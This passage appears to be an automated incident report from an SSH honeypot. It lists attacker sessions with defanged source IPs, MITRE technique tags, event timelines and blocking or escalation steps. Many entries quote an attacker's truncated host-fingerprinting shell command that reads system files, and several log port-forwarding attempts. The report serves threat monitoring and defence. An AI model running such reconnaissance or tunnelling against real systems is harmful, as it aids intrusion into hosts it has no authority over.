| `2026-07-15 19:07:27` | `cowrie.command.input` |
| `2026-07-15 19:07:28` | `cowrie.log.closed` |
| `2026-07-15 19:07:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4da52754068e

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 19:07 |
| **Last Seen** | 2026-07-15 19:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:07:39` | `cowrie.session.connect` |
| `2026-07-15 19:07:39` | `cowrie.client.version` |
| `2026-07-15 19:07:39` | `cowrie.client.kex` |
| `2026-07-15 19:07:40` | `cowrie.login.success` |
| `2026-07-15 19:07:40` | `cowrie.session.params` |
| `2026-07-15 19:07:40` | `cowrie.command.input` |
| `2026-07-15 19:07:40` | `cowrie.log.closed` |
| `2026-07-15 19:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ea014a579d5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:09 |
| **Last Seen** | 2026-07-15 19:09 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:09:11` | `cowrie.session.connect` |
| `2026-07-15 19:09:11` | `cowrie.client.version` |
| `2026-07-15 19:09:11` | `cowrie.client.kex` |
| `2026-07-15 19:09:12` | `cowrie.login.success` |
| `2026-07-15 19:09:13` | `cowrie.session.params` |
| `2026-07-15 19:09:13` | `cowrie.command.input` |
| `2026-07-15 19:09:13` | `cowrie.command.input` |
| `2026-07-15 19:09:13` | `cowrie.command.input` |
| `2026-07-15 19:09:13` | `cowrie.command.input` |
| `2026-07-15 19:09:13` | `cowrie.command.input` |
| `2026-07-15 19:09:13` | `cowrie.command.success` |
| `2026-07-15 19:09:13` | `cowrie.command.input` |
| `2026-07-15 19:09:13` | `cowrie.command.input` |
| `2026-07-15 19:09:13` | `cowrie.command.input` |
| `2026-07-15 19:09:13` | `cowrie.command.input` |
| `2026-07-15 19:09:14` | `cowrie.log.closed` |
| `2026-07-15 19:09:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02f23e6114a9

| Field | Detail |
|---|---|
| **Source IP** | `218.149.235[.]152` |
| **First Seen** | 2026-07-15 19:09 |
| **Last Seen** | 2026-07-15 19:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:09:16` | `cowrie.session.connect` |
| `2026-07-15 19:09:16` | `cowrie.client.version` |
| `2026-07-15 19:09:16` | `cowrie.client.kex` |
| `2026-07-15 19:09:19` | `cowrie.login.success` |
| `2026-07-15 19:09:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:09:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.149.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `218.149.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac811d79d62d

| Field | Detail |
|---|---|
| **Source IP** | `175.206.113[.]91` |
| **First Seen** | 2026-07-15 19:09 |
| **Last Seen** | 2026-07-15 19:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:09:25` | `cowrie.session.connect` |
| `2026-07-15 19:09:26` | `cowrie.client.version` |
| `2026-07-15 19:09:26` | `cowrie.client.kex` |
| `2026-07-15 19:09:29` | `cowrie.login.success` |
| `2026-07-15 19:09:30` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.206.113[.]91` to AbuseIPDB if not already reported
- [ ] Block `175.206.113[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad63abc1583c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:11 |
| **Last Seen** | 2026-07-15 19:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:11:23` | `cowrie.session.connect` |
| `2026-07-15 19:11:23` | `cowrie.client.version` |
| `2026-07-15 19:11:23` | `cowrie.client.kex` |
| `2026-07-15 19:11:24` | `cowrie.login.success` |
| `2026-07-15 19:11:24` | `cowrie.session.params` |
| `2026-07-15 19:11:24` | `cowrie.command.input` |
| `2026-07-15 19:11:24` | `cowrie.command.input` |
| `2026-07-15 19:11:24` | `cowrie.command.input` |
| `2026-07-15 19:11:24` | `cowrie.command.input` |
| `2026-07-15 19:11:24` | `cowrie.command.input` |
| `2026-07-15 19:11:24` | `cowrie.command.success` |
| `2026-07-15 19:11:24` | `cowrie.command.input` |
| `2026-07-15 19:11:24` | `cowrie.command.input` |
| `2026-07-15 19:11:24` | `cowrie.command.input` |
| `2026-07-15 19:11:24` | `cowrie.command.input` |
| `2026-07-15 19:11:25` | `cowrie.log.closed` |
| `2026-07-15 19:11:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a67a3c119b3c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:13 |
| **Last Seen** | 2026-07-15 19:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:13:52` | `cowrie.session.connect` |
| `2026-07-15 19:13:52` | `cowrie.client.version` |
| `2026-07-15 19:13:52` | `cowrie.client.kex` |
| `2026-07-15 19:13:52` | `cowrie.login.success` |
| `2026-07-15 19:13:53` | `cowrie.session.params` |
| `2026-07-15 19:13:53` | `cowrie.command.input` |
| `2026-07-15 19:13:53` | `cowrie.command.input` |
| `2026-07-15 19:13:53` | `cowrie.command.input` |
| `2026-07-15 19:13:53` | `cowrie.command.input` |
| `2026-07-15 19:13:53` | `cowrie.command.input` |
| `2026-07-15 19:13:53` | `cowrie.command.success` |
| `2026-07-15 19:13:53` | `cowrie.command.input` |
| `2026-07-15 19:13:53` | `cowrie.command.input` |
| `2026-07-15 19:13:53` | `cowrie.command.input` |
| `2026-07-15 19:13:53` | `cowrie.command.input` |
| `2026-07-15 19:13:53` | `cowrie.log.closed` |
| `2026-07-15 19:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a7353890a2

| Field | Detail |
|---|---|
| **Source IP** | `122.117.30[.]20` |
| **First Seen** | 2026-07-15 19:16 |
| **Last Seen** | 2026-07-15 19:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:16:07` | `cowrie.session.connect` |
| `2026-07-15 19:16:08` | `cowrie.client.version` |
| `2026-07-15 19:16:08` | `cowrie.client.kex` |
| `2026-07-15 19:16:10` | `cowrie.login.success` |
| `2026-07-15 19:16:11` | `cowrie.direct-tcpip.request` |
| `2026-07-15 19:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.117.30[.]20` to AbuseIPDB if not already reported
- [ ] Block `122.117.30[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac18cc5c936

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:16 |
| **Last Seen** | 2026-07-15 19:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:16:51` | `cowrie.session.connect` |
| `2026-07-15 19:16:52` | `cowrie.client.version` |
| `2026-07-15 19:16:52` | `cowrie.client.kex` |
| `2026-07-15 19:16:54` | `cowrie.login.success` |
| `2026-07-15 19:16:55` | `cowrie.session.params` |
| `2026-07-15 19:16:55` | `cowrie.command.input` |
| `2026-07-15 19:16:55` | `cowrie.command.input` |
| `2026-07-15 19:16:55` | `cowrie.command.input` |
| `2026-07-15 19:16:55` | `cowrie.command.input` |
| `2026-07-15 19:16:55` | `cowrie.command.input` |
| `2026-07-15 19:16:55` | `cowrie.command.success` |
| `2026-07-15 19:16:55` | `cowrie.command.input` |
| `2026-07-15 19:16:55` | `cowrie.command.input` |
| `2026-07-15 19:16:55` | `cowrie.command.input` |
| `2026-07-15 19:16:55` | `cowrie.command.input` |
| `2026-07-15 19:16:56` | `cowrie.log.closed` |
| `2026-07-15 19:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-461e09f1ed49

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:18 |
| **Last Seen** | 2026-07-15 19:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:18:34` | `cowrie.session.connect` |
| `2026-07-15 19:18:35` | `cowrie.client.version` |
| `2026-07-15 19:18:35` | `cowrie.client.kex` |
| `2026-07-15 19:18:36` | `cowrie.login.success` |
| `2026-07-15 19:18:37` | `cowrie.session.params` |
| `2026-07-15 19:18:37` | `cowrie.command.input` |
| `2026-07-15 19:18:37` | `cowrie.command.input` |
| `2026-07-15 19:18:37` | `cowrie.command.input` |
| `2026-07-15 19:18:37` | `cowrie.command.input` |
| `2026-07-15 19:18:37` | `cowrie.command.input` |
| `2026-07-15 19:18:37` | `cowrie.command.success` |
| `2026-07-15 19:18:37` | `cowrie.command.input` |
| `2026-07-15 19:18:37` | `cowrie.command.input` |
| `2026-07-15 19:18:37` | `cowrie.command.input` |
| `2026-07-15 19:18:37` | `cowrie.command.input` |
| `2026-07-15 19:18:37` | `cowrie.log.closed` |
| `2026-07-15 19:18:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-710a31d8750d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:21 |
| **Last Seen** | 2026-07-15 19:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:21:01` | `cowrie.session.connect` |
| `2026-07-15 19:21:01` | `cowrie.client.version` |
| `2026-07-15 19:21:01` | `cowrie.client.kex` |
| `2026-07-15 19:21:01` | `cowrie.login.success` |
| `2026-07-15 19:21:02` | `cowrie.session.params` |
| `2026-07-15 19:21:02` | `cowrie.command.input` |
| `2026-07-15 19:21:02` | `cowrie.command.input` |
| `2026-07-15 19:21:02` | `cowrie.command.input` |
| `2026-07-15 19:21:02` | `cowrie.command.input` |
| `2026-07-15 19:21:02` | `cowrie.command.input` |
| `2026-07-15 19:21:02` | `cowrie.command.success` |
| `2026-07-15 19:21:02` | `cowrie.command.input` |
| `2026-07-15 19:21:02` | `cowrie.command.input` |
| `2026-07-15 19:21:02` | `cowrie.command.input` |
| `2026-07-15 19:21:02` | `cowrie.command.input` |
| `2026-07-15 19:21:02` | `cowrie.log.closed` |
| `2026-07-15 19:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18c1ecc48302

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:24 |
| **Last Seen** | 2026-07-15 19:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:24:36` | `cowrie.session.connect` |
| `2026-07-15 19:24:37` | `cowrie.client.version` |
| `2026-07-15 19:24:37` | `cowrie.client.kex` |
| `2026-07-15 19:24:38` | `cowrie.login.success` |
| `2026-07-15 19:24:39` | `cowrie.session.params` |
| `2026-07-15 19:24:39` | `cowrie.command.input` |
| `2026-07-15 19:24:39` | `cowrie.command.input` |
| `2026-07-15 19:24:39` | `cowrie.command.input` |
| `2026-07-15 19:24:39` | `cowrie.command.input` |
| `2026-07-15 19:24:39` | `cowrie.command.input` |
| `2026-07-15 19:24:39` | `cowrie.command.success` |
| `2026-07-15 19:24:39` | `cowrie.command.input` |
| `2026-07-15 19:24:39` | `cowrie.command.input` |
| `2026-07-15 19:24:39` | `cowrie.command.input` |
| `2026-07-15 19:24:39` | `cowrie.command.input` |
| `2026-07-15 19:24:40` | `cowrie.log.closed` |
| `2026-07-15 19:24:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-737bb733ce6b

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-15 19:25 |
| **Last Seen** | 2026-07-15 19:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:25:24` | `cowrie.session.connect` |
| `2026-07-15 19:25:24` | `cowrie.client.version` |
| `2026-07-15 19:25:24` | `cowrie.client.kex` |
| `2026-07-15 19:25:25` | `cowrie.login.success` |
| `2026-07-15 19:25:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa8af7170e30

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-15 19:25 |
| **Last Seen** | 2026-07-15 19:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:25:25` | `cowrie.session.connect` |
| `2026-07-15 19:25:25` | `cowrie.client.version` |
| `2026-07-15 19:25:25` | `cowrie.client.kex` |
| `2026-07-15 19:25:26` | `cowrie.login.success` |
| `2026-07-15 19:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acdc99ee22e6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:26 |
| **Last Seen** | 2026-07-15 19:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:26:25` | `cowrie.session.connect` |
| `2026-07-15 19:26:25` | `cowrie.client.version` |
| `2026-07-15 19:26:25` | `cowrie.client.kex` |
| `2026-07-15 19:26:27` | `cowrie.login.success` |
| `2026-07-15 19:26:28` | `cowrie.session.params` |
| `2026-07-15 19:26:28` | `cowrie.command.input` |
| `2026-07-15 19:26:28` | `cowrie.command.input` |
| `2026-07-15 19:26:28` | `cowrie.command.input` |
| `2026-07-15 19:26:28` | `cowrie.command.input` |
| `2026-07-15 19:26:28` | `cowrie.command.input` |
| `2026-07-15 19:26:28` | `cowrie.command.success` |
| `2026-07-15 19:26:28` | `cowrie.command.input` |
| `2026-07-15 19:26:28` | `cowrie.command.input` |
| `2026-07-15 19:26:28` | `cowrie.command.input` |
| `2026-07-15 19:26:28` | `cowrie.command.input` |
| `2026-07-15 19:26:29` | `cowrie.log.closed` |
| `2026-07-15 19:26:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a8036f3c79

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:28 |
| **Last Seen** | 2026-07-15 19:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 19:28:07` | `cowrie.session.connect` |
| `2026-07-15 19:28:07` | `cowrie.client.version` |
| `2026-07-15 19:28:07` | `cowrie.client.kex` |
| `2026-07-15 19:28:09` | `cowrie.login.success` |
| `2026-07-15 19:28:10` | `cowrie.session.params` |
| `2026-07-15 19:28:10` | `cowrie.command.input` |
| `2026-07-15 19:28:10` | `cowrie.command.input` |
| `2026-07-15 19:28:10` | `cowrie.command.input` |
| `2026-07-15 19:28:10` | `cowrie.command.input` |
| `2026-07-15 19:28:10` | `cowrie.command.input` |
| `2026-07-15 19:28:10` | `cowrie.command.success` |
| `2026-07-15 19:28:10` | `cowrie.command.input` |
| `2026-07-15 19:28:10` | `cowrie.command.input` |
| `2026-07-15 19:28:10` | `cowrie.command.input` |
| `2026-07-15 19:28:10` | `cowrie.command.input` |
| `2026-07-15 19:28:10` | `cowrie.log.closed` |
| `2026-07-15 19:28:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-488beca3c833

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-15 19:29 |
| **Last Seen** | 2026-07-15 19:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
